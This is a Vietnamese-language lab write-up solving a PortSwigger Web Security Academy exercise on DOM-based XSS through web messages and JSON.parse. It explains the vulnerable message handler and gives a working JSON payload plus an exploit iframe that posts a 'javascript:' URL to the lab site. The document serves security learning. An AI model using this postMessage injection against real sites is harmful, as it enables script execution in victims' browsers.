## DOM XSS sử dụng tin nhắn web và JSON.parse
* <img width="689" height="397" alt="image" src="https://github.com/user-attachments/assets/53c80e10-82cb-46c2-a73c-5e72c4871911" />
* Đọc đoạn code này tôi thấy được là
* <pre> window.addEventListener('message', function(e) {
      var iframe = document.createElement('iframe'), ACMEplayer = {element: iframe}, d;
      document.body.appendChild(iframe);
      ...
</pre>
* Trang web tạo ra 1 thẻ <iframe> mới và gắn nó vào trang (appendChild)
* Nó dùng biến ACMEplayer.element để quản lý iframe này.
* <pre> try {
        d = JSON.parse(e.data);
        } catch(e) {
        return;
        }</pre>
* Đây là chỗ quan trọng nhất: Nó dùng JSON.parse(e.data) để đọc tin nhắn.
* Nếu tin nhắn bạn gửi không phải chuỗi **JSON** hợp lệ, lệnh trycatch sẽ bắt lỗi và return (dừng lại) ngay lập tức.
* => Kết luận : Bắt buộc payload của chúng ta phải đúng dạng JSON.
* Code sử dụng lệnh switch để kiểm tra thuộc tính d.type trong gói JSON
* <pre>switch(d.type) {
        case "page-load":
            ...
        case "load-channel":
            ACMEplayer.element.src = d.url;
            break;
        ...
    }</pre>
* Lỗ hổng nằm ở case "load-channel"
  * Khi type là "load-channel", nó sẽ lấy giá trị d.url từ gói JSON và gán thẳng vào src của cái iframe (ACMEplayer.element.src = d.url) 
  * Nó không hể kiểm tra xem d.url là đường dẫn web (http://) hay là mã độc (javascript:)
* Từ đoạn code trên để kích hoạt được XSS, chúng ta cần gửi 1 gói tin thỏa mãn 2 điều kiện:
* 1. Phải là JSON (để qua được bước JSON.parse)
* 2. Phải có type là "load-channel" (để lọt vào case bị lỗi)
* 3. Phải có url chứa mã độc (để gán vào src)
* <pre>{
  "type": "load-channel",
  "url": "javascript:print()"
}</pre> 
* <iframe src="https://0ae800ab04039bc580f40322005e0028.web-security-academy.net/" onload='this.contentWindow.postMessage("{\"type\":\"load-channel\",\"url\":\"javascript:print()\"}", "*")'></iframe>
* Gửi payload này vào máy chủ khai thác thế là tôi đã solve được bài này.
